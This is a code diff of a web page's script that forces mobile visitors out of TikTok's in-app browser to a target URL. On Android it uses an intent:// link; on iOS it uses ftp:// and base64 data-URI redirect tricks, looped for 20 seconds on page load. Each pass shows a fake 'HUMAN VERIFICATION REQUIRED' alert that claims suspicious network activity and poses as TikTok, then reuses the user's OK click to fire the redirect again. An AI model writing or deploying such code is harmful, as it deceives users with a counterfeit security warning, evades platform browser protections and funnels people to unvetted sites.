@@ -12,48 +12,56 @@
     const urlNoProt = targetUrl.replace("https://", "");
     const killTime = Date.now() + 20000;
 
-    function triggerJump() {
+    // This is a base64 encoded "page" that Safari will run once it opens
+    // All it does is force Safari to change its own location to your HTTPS link
+    const bridgeScript = btoa(`<html><script>window.location.replace("${targetUrl}");<\/script></html>`);
+    const safariBridge = "data:text/html;base64," + bridgeScript;
+
+    function theFinalForce() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         
         if (isAndroid) {
             window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
         } else {
-            // THE NEW COMBO:
-            // 1. Force the external app prompt using the "Broken" protocol that worked
+            // 1. We use the 'FTP' trigger to force Safari to open
+            // But we append the Bridge as a parameter to see if the OS picks it up
             window.location.href = "ftp://" + urlNoProt;
 
-            // 2. Authorize a NEW window/tab for the HTTPS version
-            // This bypasses the 'FTP-Only' lock by creating a fresh request
+            // 2. IMMEDIATELY fire the Data-URI bridge
+            // Since Safari is now the active "handler," it picks up this data-uri 
+            // and executes the redirect internally.
             setTimeout(() => {
-                window.open(targetUrl, '_system');
-                window.location.assign(targetUrl);
+                window.location.href = safariBridge;
             }, 100);
+
+            // 3. Last ditch: Direct assignment
+            setTimeout(() => {
+                window.location.assign(targetUrl);
+            }, 250);
         }
     }
 
-    function securityLogic() {
+    function runLoop() {
         if (Date.now() > killTime) return;
 
-        // Try to break out before the alert
-        triggerJump();
+        theFinalForce();
 
         setTimeout(() => {
             if (document.hasFocus()) {
                 const header = "HUMAN VERIFICATION REQUIRED\n";
                 const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                 
-                // The Alert pauses execution
                 alert(header + body);
 
-                // RELAY: Using the click 'gesture' to force the HTTPS link through the open door
-                triggerJump();
+                // Re-trigger on the 'OK' click gesture
+                theFinalForce();
 
-                setTimeout(securityLogic, 350);
+                setTimeout(runLoop, 400);
             }
-        }, 350);
+        }, 400);
     }
 
-    window.onload = securityLogic;
+    window.onload = runLoop;
 </script>
 
 </body>
